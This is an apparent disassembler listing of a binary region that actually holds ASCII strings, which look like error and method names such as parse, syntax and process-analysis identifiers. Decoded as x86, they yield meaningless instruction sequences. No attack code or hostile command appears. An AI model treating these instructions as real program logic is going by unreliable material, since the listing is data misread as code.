  406fb1:	jb     0x406fb3
  406fb3:	addr16 gs je 0x407016
  406fb7:	push   ecx
  406fb8:	jne    0x40701f
  406fba:	jb     0x407035
  406fbc:	dec    edi
  406fbd:	jne    0x407033
  406fbf:	jo     0x407036
  406fc1:	je     0x407011
  406fc3:	outs   dx,DWORD PTR ds:[esi]
  406fc4:	je     0x407009
  406fc6:	outs   dx,DWORD PTR ds:[esi]
  406fc7:	ins    BYTE PTR es:[edi],dx
  406fc8:	ins    BYTE PTR es:[edi],dx
  406fc9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  406fce:	add    BYTE PTR [bx+0x65],ah
  406fd2:	je     0x407033
  406fd4:	push   ecx
  406fd5:	jne    0x40703c
  406fd7:	jb     0x407052
  406fd9:	dec    edi
  406fda:	jne    0x407050
  406fdc:	jo     0x407053
  406fde:	je     0x407033
  406fe0:	gs jae 0x407056
  406fe3:	imul   ebp,DWORD PTR [edi+0x6e],0x73754273
  406fea:	jns    0x406fec
  406fec:	addr16 gs je 0x40704f
  406ff0:	push   edx
  406ff1:	gs popa 
  406ff3:	fs inc ebp
  406ff5:	jb     0x407069
  406ff7:	outs   dx,DWORD PTR ds:[esi]
  406ff8:	jb     0x40703e
  406ffa:	jne    0x40706c
  406ffc:	ins    BYTE PTR es:[edi],dx
  406ffd:	imul   esp,DWORD PTR [ebx+0x61],0x61506574
  407004:	jb     0x407067
  407006:	ins    DWORD PTR es:[edi],dx
  407007:	add    BYTE PTR [edi+0x65],ah
  40700a:	je     0x40706b
  40700c:	push   edx
  40700d:	gs popa 
  40700f:	fs inc ebp
  407011:	jb     0x407085
  407013:	outs   dx,DWORD PTR ds:[esi]
  407014:	jb     0x40705c
  407016:	popa   
  407017:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x73726150
  40701f:	add    BYTE PTR gs:[edi+0x65],ah
  407023:	je     0x407084
  407025:	push   edx
  407026:	gs popa 
  407028:	fs inc ebp
  40702a:	jb     0x40709e
  40702c:	outs   dx,DWORD PTR ds:[esi]
  40702d:	jb     0x407078
  40702f:	outs   dx,BYTE PTR ds:[esi]
  407030:	jbe    0x407093
  407032:	ins    BYTE PTR es:[edi],dx
  407033:	imul   esp,DWORD PTR [ebx+edx*2+0x79],0x7861746e
  40703b:	add    BYTE PTR [edi+0x65],ah
  40703e:	je     0x40709f
  407040:	push   edx
  407041:	gs popa 
  407043:	fs inc ebp
  407045:	jb     0x4070b9
  407047:	outs   dx,DWORD PTR ds:[esi]
  407048:	jb     0x407097
  40704a:	imul   esi,DWORD PTR [ebx+0x73],0x4d676e69
  407051:	popa   
  407052:	outs   dx,BYTE PTR ds:[esi]
  407053:	imul   esi,DWORD PTR fs:[edi+ebp*2+0x72],0x65670079
  40705c:	je     0x4070bd
  40705e:	push   ebx
  40705f:	gs jae 0x4070d5
  407062:	imul   ebp,DWORD PTR [edi+0x6e],0x6f727245
  407069:	jb     0x4070b4
  40706b:	outs   dx,BYTE PTR ds:[esi]
  40706c:	jbe    0x4070cf
  40706e:	ins    BYTE PTR es:[edi],dx
  40706f:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x72656461
  407077:	add    BYTE PTR [edi+0x65],ah
  40707a:	je     0x4070db
  40707c:	push   ebx
  40707d:	je     0x4070e0
  40707f:	jb     0x4070f5
  407081:	dec    edi
  407082:	jne    0x4070f8
  407084:	jo     0x4070fb
  407086:	je     0x4070cb
  407088:	outs   dx,DWORD PTR ds:[esi]
  407089:	ins    BYTE PTR es:[edi],dx
  40708a:	ins    BYTE PTR es:[edi],dx
  40708b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407090:	outs   dx,BYTE PTR ds:[esi]
  407091:	inc    ecx
  407092:	ins    BYTE PTR es:[edi],dx
  407093:	jb     0x4070fa
  407095:	popa   
  407096:	fs jns 0x4070e2
  407099:	outs   dx,BYTE PTR ds:[esi]
  40709a:	push   eax
  40709b:	jb     0x40710c
  40709d:	addr16 jb 0x407105
  4070a0:	jae    0x407115
  4070a2:	add    BYTE PTR [edi+0x65],ah
  4070a5:	je     0x407106
  4070a7:	push   ebx
  4070a8:	jns    0x40711d
  4070aa:	je     0x407111
  4070ac:	ins    DWORD PTR es:[edi],dx
  4070ad:	push   edi
  4070ae:	imul   esp,DWORD PTR [ebp+eiz*2+0x4f],0x75707475
  4070b6:	je     0x40710b
  4070b8:	je     0x40711b
  4070ba:	jb     0x407130
  4070bc:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  4070c3:	pop    edi
  4070c4:	push   esp
  4070c5:	jb     0x407128
  4070c7:	arpl   WORD PTR [ebp+0x50],sp
  4070ca:	jb     0x40713b
  4070cc:	arpl   WORD PTR [ebp+0x73],sp
  4070cf:	jae    0x407121
  4070d1:	popa   
  4070d2:	jb     0x407147
  4070d4:	imul   ebp,DWORD PTR [esi+0x67],0x74786554
  4070db:	add    BYTE PTR [edi+0x65],ah
  4070de:	je     0x40713f
  4070e0:	push   esp
  4070e1:	jb     0x407144
  4070e3:	arpl   WORD PTR [ebp+0x50],sp
  4070e6:	jb     0x407157
  4070e8:	arpl   WORD PTR [ebp+0x73],sp
  4070eb:	jae    0x407141
  4070ed:	popa   
  4070ee:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4e]
  4070f2:	popa   
  4070f3:	ins    DWORD PTR es:[edi],dx
  4070f4:	gs dec eax
  4070f6:	gs popa 
  4070f8:	fs gs jb 0x4070fc
  4070fc:	addr16 gs je 0x40715f
  407100:	push   esp
  407101:	jb     0x407164
  407103:	arpl   WORD PTR [ebp+0x50],sp
  407106:	jb     0x407177
  407108:	arpl   WORD PTR [ebp+0x73],sp
  40710b:	jae    0x407161
  40710d:	popa   
  40710e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x50]
  407112:	imul   esp,DWORD PTR [eax+ecx*2+0x65],0x72656461
  40711a:	add    BYTE PTR [edi+0x65],ah
  40711d:	je     0x40717e
  40711f:	push   esp
  407120:	jb     0x407183
  407122:	arpl   WORD PTR [ebp+0x50],sp
  407125:	jb     0x407196
  407127:	arpl   WORD PTR [ebp+0x73],sp
  40712a:	jae    0x407180
  40712c:	popa   
  40712d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  407131:	gs js  0x4071a8
  407134:	add    BYTE PTR [edi+0x65],ah
  407137:	je     0x407198
  407139:	push   ebp
  40713a:	outs   dx,BYTE PTR ds:[esi]
  40713b:	popa   
  40713c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  407140:	outs   dx,DWORD PTR ds:[esi]
  407141:	inc    ebx
  407142:	jb     0x4071a9
  407144:	popa   
  407145:	je     0x4071ac
  407147:	dec    edi
  407148:	jne    0x4071be
  40714a:	jo     0x4071c1
  40714c:	je     0x407192
  40714e:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  407155:	jns    0x407157
  407157:	addr16 gs je 0x4071ba
  40715b:	push   ebp
  40715c:	outs   dx,BYTE PTR ds:[esi]
  40715d:	popa   
  40715e:	jne    0x4071d4
  407160:	push   0x7a69726f
  407165:	gs fs inc ecx
  407168:	arpl   WORD PTR [ebx+0x65],sp
  40716b:	jae    0x4071e0
  40716d:	push   esp
  40716e:	outs   dx,DWORD PTR ds:[esi]
  40716f:	dec    edi
  407170:	jne    0x4071e6
  407172:	jo     0x4071e9
  407174:	je     0x4071ba
  407176:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40717d:	jns    0x40717f
  40717f:	inc    ebx
  407180:	jne    0x4071ee
  407182:	je     0x4071f9
  407184:	jb     0x4071eb
  407186:	add    BYTE PTR [ecx+0x6e],al
  407189:	popa   
  40718a:	ins    BYTE PTR es:[edi],dx
  40718b:	jns    0x407207
  40718d:	gs inc ebx
  40718f:	popa   
  407190:	outs   dx,BYTE PTR ds:[esi]
  407191:	je     0x4071d9
  407193:	imul   ebp,DWORD PTR [esi+0x64],0x63657053
  40719a:	imul   esp,DWORD PTR [esi+0x69],0x72506465
  4071a1:	outs   dx,DWORD PTR ds:[esi]
  4071a2:	arpl   WORD PTR [ebp+0x73],sp
  4071a5:	jae    0x4071a7
  4071a7:	inc    ecx
  4071a8:	outs   dx,BYTE PTR ds:[esi]
  4071a9:	popa   
  4071aa:	ins    BYTE PTR es:[edi],dx
  4071ab:	jns    0x407227
  4071ad:	gs inc ebx
  4071af:	outs   dx,DWORD PTR ds:[esi]
  4071b0:	ins    DWORD PTR es:[edi],dx
  4071b1:	jo     0x40721f
  4071b3:	gs je  0x40721b
  4071b6:	add    BYTE PTR [ecx+0x6e],al
  4071b9:	popa   
  4071ba:	ins    BYTE PTR es:[edi],dx
  4071bb:	jns    0x407237
  4071bd:	gs inc ebp
  4071bf:	jb     0x407233
  4071c1:	outs   dx,DWORD PTR ds:[esi]
  4071c2:	jb     0x40720a
  4071c4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x6e73656f
  4071cc:	je     0x407213
  4071ce:	js     0x407239
  4071d0:	jae    0x407246
  4071d2:	add    BYTE PTR [ecx+0x6e],al
  4071d5:	popa   
  4071d6:	ins    BYTE PTR es:[edi],dx
  4071d7:	jns    0x407253
  4071d9:	gs inc ebp
  4071db:	jb     0x40724f
  4071dd:	outs   dx,DWORD PTR ds:[esi]
  4071de:	jb     0x407232
  4071e0:	gs jno 0x407258
  4071e3:	imul   esi,DWORD PTR [edx+0x65],0x6e695373
  4071ea:	ins    BYTE PTR es:[di],dx
  4071ec:	gs push eax
  4071ee:	imul   esp,DWORD PTR [eax+eax*1+0x41],0x796c616e
  4071f6:	jp     0x40725d
  4071f8:	inc    ebp
  4071f9:	jb     0x40726d
  4071fb:	outs   dx,DWORD PTR ds:[esi]
  4071fc:	jb     0x407252
  4071fe:	jb     0x407261
  407200:	arpl   WORD PTR [ebp+0x49],sp
  407203:	outs   dx,BYTE PTR ds:[esi]
  407204:	jbe    0x407267
  407206:	ins    BYTE PTR es:[edi],dx
  407207:	imul   esp,DWORD PTR [eax+eax*1+0x41],0x796c616e
  40720f:	jp     0x407276
  407211:	push   ebx
  407212:	jo     0x407279
  407214:	arpl   WORD PTR [ecx+0x66],bp
  407217:	imul   esp,DWORD PTR [ebp+0x64],0x636f7250
  40721e:	gs jae 0x407294
  407221:	dec    ecx
  407222:	jae    0x407265
  407224:	ins    DWORD PTR es:[edi],dx
  407225:	bound  ebp,QWORD PTR [ecx+0x67]
  407228:	jne    0x407299
  40722a:	jne    0x40729f
  40722c:	add    BYTE PTR [ecx+0x6e],al
  40722f:	popa   
  407230:	ins    BYTE PTR es:[edi],dx
  407231:	jns    0x4072ad
  407233:	gs push ebx
  407235:	je     0x407298
  407237:	jb     0x4072ad
  407239:	imul   ebp,DWORD PTR [esi+0x67],0x616e4100
  407240:	ins    BYTE PTR es:[edi],dx
  407241:	jns    0x4072bd
  407243:	gs push edi
  407245:	popa   
  407246:	jb     0x4072b6
  407248:	push   edi
  407249:	outs   dx,DWORD PTR ds:[esi]
  40724a:	outs   dx,BYTE PTR ds:[esi]
  40724b:	je     0x40729f
  40724d:	gs ins DWORD PTR es:[edi],dx
  40724f:	outs   dx,DWORD PTR ds:[esi]
  407250:	jbe    0x4072b7
  407252:	inc    ebp
  407253:	je     0x4072c1
  407255:	jae    0x407257
  407257:	inc    ecx
  407258:	jo     0x4072ca
  40725a:	dec    eax
  40725b:	gs popa 
  40725d:	fs gs jb 0x4072b5
  407261:	gs js  0x4072d8
  407264:	add    BYTE PTR [ecx+0x74],al
  407267:	je     0x4072ca
  407269:	arpl   WORD PTR [eax+0x4f],bp
  40726c:	jne    0x4072e2
  40726e:	jo     0x4072e5
  407270:	je     0x4072b5
  407272:	popa   
  407273:	outs   dx,BYTE PTR ds:[esi]
  407274:	je     0x4072b7
  407276:	je     0x4072ec
  407278:	popa   
  407279:	arpl   WORD PTR [eax+0x0],bp
  40727c:	inc    ecx
  40727d:	je     0x4072f3
  40727f:	popa   
  407280:	arpl   WORD PTR [eax+0x4f],bp
  407283:	jne    0x4072f9
  407285:	jo     0x4072fc
  407287:	je     0x4072dc
  407289:	je     0x4072ec
  40728b:	jb     0x407301
  40728d:	imul   ebp,DWORD PTR [esi+0x67],0x6c6f4300
  407294:	ins    BYTE PTR es:[edi],dx
  407295:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40729a:	outs   dx,BYTE PTR ds:[esi]
  40729b:	push   ebx
  40729c:	je     0x4072ff
  40729e:	jb     0x407314
  4072a0:	gs fs dec ebp
  4072a3:	gs jae 0x407319
  4072a6:	popa   
  4072a7:	add    BYTE PTR gs:[bp+di+0x6f],al
  4072ac:	ins    DWORD PTR es:[edi],dx
  4072ad:	ins    DWORD PTR es:[edi],dx
  4072ae:	popa   
  4072af:	outs   dx,BYTE PTR ds:[esi]
  4072b0:	fs inc ecx
  4072b2:	outs   dx,BYTE PTR ds:[esi]
  4072b3:	popa   
  4072b4:	ins    BYTE PTR es:[edi],dx
  4072b5:	jns    0x407331
  4072b7:	add    BYTE PTR gs:[ebx+0x6f],al
  4072bb:	ins    DWORD PTR es:[edi],dx
  4072bc:	ins    DWORD PTR es:[edi],dx
  4072bd:	popa   
  4072be:	outs   dx,BYTE PTR ds:[esi]
  4072bf:	fs inc ecx
  4072c1:	je     0x407337
  4072c3:	popa   
  4072c4:	arpl   WORD PTR [eax+0x0],bp
  4072c7:	inc    ebx
  4072c8:	outs   dx,DWORD PTR ds:[esi]
  4072c9:	ins    DWORD PTR es:[edi],dx
  4072ca:	ins    DWORD PTR es:[edi],dx
  4072cb:	popa   
  4072cc:	outs   dx,BYTE PTR ds:[esi]
  4072cd:	fs inc ebx
  4072cf:	outs   dx,DWORD PTR ds:[esi]
  4072d0:	outs   dx,BYTE PTR ds:[esi]
  4072d1:	imul   sp,WORD PTR [edi+0x0],0x6f43
  4072d7:	ins    DWORD PTR es:[edi],dx
  4072d8:	ins    DWORD PTR es:[edi],dx
  4072d9:	popa   
  4072da:	outs   dx,BYTE PTR ds:[esi]
  4072db:	fs inc esp
  4072dd:	gs je  0x407341
  4072e0:	arpl   WORD PTR [eax+0x0],bp
  4072e3:	inc    ebx
  4072e4:	outs   dx,DWORD PTR ds:[esi]
  4072e5:	ins    DWORD PTR es:[edi],dx
  4072e6:	ins    DWORD PTR es:[edi],dx
  4072e7:	popa   
  4072e8:	outs   dx,BYTE PTR ds:[esi]
  4072e9:	fs dec esp
  4072eb:	popa   
  4072ec:	jne    0x40735c
  4072ee:	arpl   WORD PTR [eax+0x0],bp
  4072f1:	inc    ebx
  4072f2:	outs   dx,DWORD PTR ds:[esi]
  4072f3:	ins    DWORD PTR es:[edi],dx
  4072f4:	ins    DWORD PTR es:[edi],dx
  4072f5:	popa   
  4072f6:	outs   dx,BYTE PTR ds:[esi]
  4072f7:	fs dec esp
  4072f9:	popa   
  4072fa:	jne    0x40736a
  4072fc:	arpl   WORD PTR [eax+0x41],bp
  4072ff:	jb     0x407368
  407301:	jae    0x407303
  407303:	inc    ebx
  407304:	outs   dx,DWORD PTR ds:[esi]
  407305:	ins    DWORD PTR es:[edi],dx
  407306:	ins    DWORD PTR es:[edi],dx
  407307:	popa   
  407308:	outs   dx,BYTE PTR ds:[esi]
  407309:	fs dec edi
  40730b:	jne    0x407381
  40730d:	inc    esp
  40730e:	imul   esi,DWORD PTR [edx+0x0],0x6d6d6f43
  407315:	popa   
  407316:	outs   dx,BYTE PTR ds:[esi]
  407317:	fs push eax
  407319:	jb     0x40738a
  40731b:	arpl   WORD PTR [ebp+0x73],sp
  40731e:	jae    0x407320
  407320:	inc    ebx
  407321:	outs   dx,DWORD PTR ds:[esi]
  407322:	ins    DWORD PTR es:[edi],dx
  407323:	ins    DWORD PTR es:[edi],dx
  407324:	popa   
  407325:	outs   dx,BYTE PTR ds:[esi]
  407326:	fs push ecx
  407328:	jne    0x40738f
  40732a:	jb     0x4073a5
  40732c:	add    BYTE PTR [ebp+eiz*2+0x74],al
  407330:	popa   
  407331:	arpl   WORD PTR [eax+0x4f],bp
  407334:	jne    0x4073aa
  407336:	jo     0x4073ad
  407338:	je     0x407380
  40733a:	popa   
  40733b:	imul   ebp,DWORD PTR [esi+ecx*2+0x6f],0x6c6f4374
  407343:	ins    BYTE PTR es:[edi],dx
  407344:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  407349:	add    BYTE PTR [si+0x65],al
  40734d:	je     0x4073b0
  40734f:	arpl   WORD PTR [eax+0x4f],bp
  407352:	jne    0x4073c8
  407354:	jo     0x4073cb
  407356:	je     0x4073ab
  407358:	je     0x4073c9
  40735a:	jo     0x4073a2
  40735c:	popa   
  40735d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74654400
  407365:	popa   
  407366:	arpl   WORD PTR [eax+0x4f],bp
  407369:	jne    0x4073df
  40736b:	jo     0x4073e2
  40736d:	je     0x4073c2
  40736f:	je     0x4073e0
  407371:	jo     0x4073e3
  407373:	gs add BYTE PTR fs:[ebp+eiz*2+0x74],al
  407379:	popa   
  40737a:	arpl   WORD PTR [eax+0x4f],bp
  40737d:	jne    0x4073f3
  40737f:	jo     0x4073f6
  407381:	je     0x4073d6
  407383:	je     0x4073f4
  407385:	jo     0x4073f7
  407387:	imul   ebp,DWORD PTR [esi+0x67],0x74614600
  40738e:	popa   
  40738f:	ins    BYTE PTR es:[edi],dx
  407390:	inc    ebp
  407391:	jb     0x407405
  407393:	outs   dx,DWORD PTR ds:[esi]
  407394:	jb     0x407396
  407396:	dec    ecx
  407397:	outs   dx,BYTE PTR ds:[esi]
  407398:	jbe    0x4073fb
  40739a:	ins    BYTE PTR es:[edi],dx
  40739b:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  4073a3:	fs dec esp
  4073a5:	imul   ebp,DWORD PTR [esi+0x65],0x75614c00
  4073ac:	outs   dx,BYTE PTR ds:[esi]
  4073ad:	arpl   WORD PTR [eax+0x4f],bp
  4073b0:	jne    0x407426
  4073b2:	jo     0x407429
  4073b4:	je     0x4073fc
  4073b6:	popa   
  4073b7:	imul   ebp,DWORD PTR [ebx+eax*2+0x61],0x7453746e
  4073bf:	popa   
  4073c0:	jb     0x407436
  4073c2:	add    BYTE PTR [ecx+eiz*2+0x75],cl
  4073c6:	outs   dx,BYTE PTR ds:[esi]
  4073c7:	arpl   WORD PTR [eax+0x4f],bp
  4073ca:	jne    0x407440
  4073cc:	jo     0x407443
  4073ce:	je     0x407423
  4073d0:	je     0x407433
  4073d2:	jb     0x407448
  4073d4:	imul   ebp,DWORD PTR [esi+0x67],0x74754f00
  4073db:	jo     0x407452
  4073dd:	je     0x407424
  4073df:	jb     0x407453
  4073e1:	outs   dx,DWORD PTR ds:[esi]
  4073e2:	jb     0x407439
  4073e4:	outs   dx,BYTE PTR ds:[esi]
  4073e5:	popa   
  4073e6:	jne    0x40745c
  4073e8:	push   0x7a69726f
  4073ed:	gs add BYTE PTR fs:[eax+0x61],dl
  4073f2:	jb     0x407455
  4073f4:	ins    DWORD PTR es:[edi],dx
  4073f5:	inc    esp
  4073f6:	gs jae 0x40745c
  4073f9:	jb     0x407464
  4073fb:	jo     0x407471
  4073fd:	imul   ebp,DWORD PTR [edi+0x6e],0x6c616e41
  407404:	jns    0x407480
  407406:	add    BYTE PTR gs:[eax+0x61],dl
  40740a:	jb     0x40746d
  40740c:	ins    DWORD PTR es:[edi],dx
  40740d:	inc    esp
  40740e:	gs jae 0x407474
  407411:	jb     0x40747c
  407413:	jo     0x407489
  407415:	imul   ebp,DWORD PTR [edi+0x6e],0x61747441
  40741c:	arpl   WORD PTR [eax+0x0],bp
  40741f:	push   eax
  407420:	popa   
  407421:	jb     0x407484
  407423:	ins    DWORD PTR es:[edi],dx
  407424:	inc    esp
  407425:	gs jae 0x40748b
  407428:	jb     0x407493
  40742a:	jo     0x4074a0
  40742c:	imul   ebp,DWORD PTR [edi+0x6e],0x666e6f43
  407433:	imul   esp,DWORD PTR [edi+0x0],0x61726150
  40743a:	ins    DWORD PTR es:[edi],dx
  40743b:	inc    esp
  40743c:	gs jae 0x4074a2
  40743f:	jb     0x4074aa
  407441:	jo     0x4074b7
  407443:	imul   ebp,DWORD PTR [edi+0x6e],0x61746544
  40744a:	arpl   WORD PTR [eax+0x0],bp
  40744d:	push   eax
  40744e:	popa   
  40744f:	jb     0x4074b2
  407451:	ins    DWORD PTR es:[edi],dx
  407452:	inc    esp
  407453:	gs jae 0x4074b9
  407456:	jb     0x4074c1
  407458:	jo     0x4074ce
  40745a:	imul   ebp,DWORD PTR [edi+0x6e],0x6e75614c
  407461:	arpl   WORD PTR [eax+0x0],bp
  407464:	push   eax
  407465:	popa   
  407466:	jb     0x4074c9
  407468:	ins    DWORD PTR es:[edi],dx
  407469:	inc    esp
  40746a:	gs jae 0x4074d0
  40746d:	jb     0x4074d8
  40746f:	jo     0x4074e5
  407471:	imul   ebp,DWORD PTR [edi+0x6e],0x6e75614c
  407478:	arpl   WORD PTR [eax+0x41],bp
  40747b:	jb     0x4074e4
  40747d:	jae    0x40747f
  40747f:	push   eax
  407480:	popa   
  407481:	jb     0x4074e4
  407483:	ins    DWORD PTR es:[edi],dx
  407484:	inc    esp
  407485:	gs jae 0x4074eb
  407488:	jb     0x4074f3
  40748a:	jo     0x407500
  40748c:	imul   ebp,DWORD PTR [edi+0x6e],0x7074754f
  407493:	jne    0x407509
  407495:	add    BYTE PTR [eax+0x61],dl
  407498:	jb     0x4074fb
  40749a:	ins    DWORD PTR es:[edi],dx
  40749b:	inc    esp
  40749c:	gs jae 0x407502
  40749f:	jb     0x40750a
  4074a1:	jo     0x407517
  4074a3:	imul   ebp,DWORD PTR [edi+0x6e],0x636f7250
  4074aa:	gs jae 0x407520
  4074ad:	add    BYTE PTR [eax+0x61],dl
  4074b0:	jb     0x407513
  4074b2:	ins    DWORD PTR es:[edi],dx
  4074b3:	inc    esp
  4074b4:	gs jae 0x40751a
  4074b7:	jb     0x407522
  4074b9:	jo     0x40752f
  4074bb:	imul   ebp,DWORD PTR [edi+0x6e],0x72657551
  4074c2:	jns    0x4074c4
  4074c4:	push   eax
  4074c5:	popa   
  4074c6:	jb     0x407529
  4074c8:	ins    DWORD PTR es:[edi],dx
  4074c9:	dec    eax
  4074ca:	gs ins BYTE PTR es:[edi],dx
  4074cc:	jo     0x407524
  4074ce:	popa   
  4074cf:	ins    BYTE PTR es:[edi],dx
  4074d0:	jne    0x407537
  4074d2:	inc    ecx
  4074d3:	outs   dx,BYTE PTR ds:[esi]
  4074d4:	popa   
  4074d5:	ins    BYTE PTR es:[edi],dx
  4074d6:	jns    0x407552
  4074d8:	add    BYTE PTR gs:[eax+0x61],dl
  4074dc:	jb     0x40753f
  4074de:	ins    DWORD PTR es:[edi],dx
  4074df:	dec    eax
  4074e0:	gs ins BYTE PTR es:[edi],dx
  4074e2:	jo     0x40753a
  4074e4:	popa   
  4074e5:	ins    BYTE PTR es:[edi],dx
  4074e6:	jne    0x40754d
  4074e8:	inc    ebx
  4074e9:	outs   dx,DWORD PTR ds:[esi]
  4074ea:	outs   dx,BYTE PTR ds:[esi]
  4074eb:	imul   sp,WORD PTR [edi+0x0],0x6150
  4074f1:	jb     0x407554
  4074f3:	ins    DWORD PTR es:[edi],dx
  4074f4:	dec    eax
  4074f5:	gs ins BYTE PTR es:[edi],dx
  4074f7:	jo     0x40754f
  4074f9:	popa   
  4074fa:	ins    BYTE PTR es:[edi],dx
  4074fb:	jne    0x407562
  4074fd:	dec    esp
  4074fe:	popa   
  4074ff:	jne    0x40756f
  407501:	arpl   WORD PTR [eax+0x0],bp
  407504:	push   eax
  407505:	popa   
  407506:	jb     0x407569
  407508:	ins    DWORD PTR es:[edi],dx
  407509:	dec    eax
  40750a:	gs ins BYTE PTR es:[edi],dx
  40750c:	jo     0x407564
  40750e:	popa   
  40750f:	ins    BYTE PTR es:[edi],dx
  407510:	jne    0x407577
  407512:	dec    esp
  407513:	popa   
  407514:	jne    0x407584
  407516:	arpl   WORD PTR [eax+0x41],bp
  407519:	jb     0x407582
  40751b:	jae    0x40751d
  40751d:	push   eax
  40751e:	popa   
  40751f:	jb     0x407582
  407521:	ins    DWORD PTR es:[edi],dx
  407522:	dec    eax
  407523:	gs ins BYTE PTR es:[edi],dx
  407525:	jo     0x40757d
  407527:	popa   
  407528:	ins    BYTE PTR es:[edi],dx
  407529:	jne    0x407590
  40752b:	dec    edi
  40752c:	jne    0x4075a2
  40752e:	jo     0x4075a5
  407530:	je     0x407532
  407532:	push   eax
  407533:	popa   
  407534:	jb     0x407597
  407536:	ins    DWORD PTR es:[edi],dx
  407537:	dec    eax
  407538:	gs ins BYTE PTR es:[edi],dx
  40753a:	jo     0x407592
  40753c:	popa   
  40753d:	ins    BYTE PTR es:[edi],dx
  40753e:	jne    0x4075a5
  407540:	push   eax
  407541:	jb     0x4075b2
  407543:	arpl   WORD PTR [ebp+0x73],sp
  407546:	jae    0x407548
  407548:	push   ecx
  407549:	jne    0x4075b0
  40754b:	jb     0x4075c6
  40754d:	dec    edi
  40754e:	jne    0x4075c4
  407550:	jo     0x4075c7
  407552:	je     0x407597
  407554:	outs   dx,DWORD PTR ds:[esi]
  407555:	ins    BYTE PTR es:[edi],dx
  407556:	ins    BYTE PTR es:[edi],dx
  407557:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  40755c:	add    BYTE PTR [bx+di+0x75],dl
  407560:	gs jb  0x4075dc
  407563:	dec    edi
  407564:	jne    0x4075da
  407566:	jo     0x4075dd
  407568:	je     0x4075af
  40756a:	jb     0x4075de
  40756c:	outs   dx,DWORD PTR ds:[esi]
  40756d:	jb     0x40756f
  40756f:	push   ecx
  407570:	jne    0x4075d7
  407572:	jb     0x4075ed
  407574:	dec    edi
  407575:	jne    0x4075eb
  407577:	jo     0x4075ee
  407579:	je     0x4075c9
  40757b:	outs   dx,DWORD PTR ds:[esi]
  40757c:	je     0x4075c1
  40757e:	outs   dx,DWORD PTR ds:[esi]
  40757f:	ins    BYTE PTR es:[edi],dx
  407580:	ins    BYTE PTR es:[edi],dx
  407581:	arpl   WORD PTR gs:[ecx+ebp*2+0x6e],si
  407586:	add    BYTE PTR [bx+di+0x75],dl
  40758a:	gs jb  0x407606
  40758d:	dec    edi
  40758e:	jne    0x407604
  407590:	jo     0x407607
  407592:	je     0x4075e7
  407594:	gs jae 0x40760a
  407597:	imul   ebp,DWORD PTR [edi+0x6e],0x73754273
  40759e:	jns    0x4075a0
  4075a0:	push   edx
  4075a1:	gs popa 
  4075a3:	fs inc ebp
  4075a5:	jb     0x407619
  4075a7:	outs   dx,DWORD PTR ds:[esi]
  4075a8:	jb     0x4075ee
  4075aa:	jne    0x40761c
  4075ac:	ins    BYTE PTR es:[edi],dx
  4075ad:	imul   esp,DWORD PTR [ebx+0x61],0x61506574
  4075b4:	jb     0x407617
  4075b6:	ins    DWORD PTR es:[edi],dx
  4075b7:	add    BYTE PTR [edx+0x65],dl
  4075ba:	popa   
  4075bb:	fs inc ebp
  4075bd:	jb     0x407631
  4075bf:	outs   dx,DWORD PTR ds:[esi]
  4075c0:	jb     0x407608
  4075c2:	popa   
  4075c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x73726150
  4075cb:	add    BYTE PTR gs:[edx+0x65],dl
  4075cf:	popa   
  4075d0:	fs inc ebp
  4075d2:	jb     0x407646
  4075d4:	outs   dx,DWORD PTR ds:[esi]
  4075d5:	jb     0x407620
  4075d7:	outs   dx,BYTE PTR ds:[esi]
  4075d8:	jbe    0x40763b
  4075da:	ins    BYTE PTR es:[edi],dx
  4075db:	imul   esp,DWORD PTR [ebx+edx*2+0x79],0x7861746e
  4075e3:	add    BYTE PTR [edx+0x65],dl
  4075e6:	popa   
  4075e7:	fs inc ebp
  4075e9:	jb     0x40765d
  4075eb:	outs   dx,DWORD PTR ds:[esi]
  4075ec:	jb     0x40763b
  4075ee:	imul   esi,DWORD PTR [ebx+0x73],0x4d676e69
  4075f5:	popa   
  4075f6:	outs   dx,BYTE PTR ds:[esi]
  4075f7:	imul   esi,DWORD PTR fs:[edi+ebp*2+0x72],0x65530079
  407600:	jae    0x407675
  407602:	imul   ebp,DWORD PTR [edi+0x6e],0x6f727245
  407609:	jb     0x407654
  40760b:	outs   dx,BYTE PTR ds:[esi]
  40760c:	jbe    0x40766f
  40760e:	ins    BYTE PTR es:[edi],dx
  40760f:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x72656461
  407617:	add    BYTE PTR [ebx+0x74],dl
  40761a:	popa   
  40761b:	jb     0x407691
  40761d:	dec    edi
  40761e:	jne    0x407694
  407620:	jo     0x407697
  407622:	je     0x407667
  407624:	outs   dx,DWORD PTR ds:[esi]
  407625:	ins    BYTE PTR es:[edi],dx
  407626:	ins    BYTE PTR es:[edi],dx
  407627:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40762c:	outs   dx,BYTE PTR ds:[esi]
  40762d:	inc    ecx
  40762e:	ins    BYTE PTR es:[edi],dx
  40762f:	jb     0x407696
  407631:	popa   
  407632:	fs jns 0x40767e
  407635:	outs   dx,BYTE PTR ds:[esi]
  407636:	push   eax
  407637:	jb     0x4076a8
  407639:	addr16 jb 0x4076a1
  40763c:	jae    0x4076b1
  40763e:	add    BYTE PTR [ebx+0x79],dl
  407641:	jae    0x4076b7
  407643:	gs ins DWORD PTR es:[edi],dx
  407645:	push   edi
  407646:	imul   esp,DWORD PTR [ebp+eiz*2+0x4f],0x75707475
  40764e:	je     0x4076a3
  407650:	je     0x4076b3
  407652:	jb     0x4076c8
  407654:	imul   ebp,DWORD PTR [esi+0x67],0x61725400
  40765b:	arpl   WORD PTR [ebp+0x50],sp
  40765e:	jb     0x4076cf
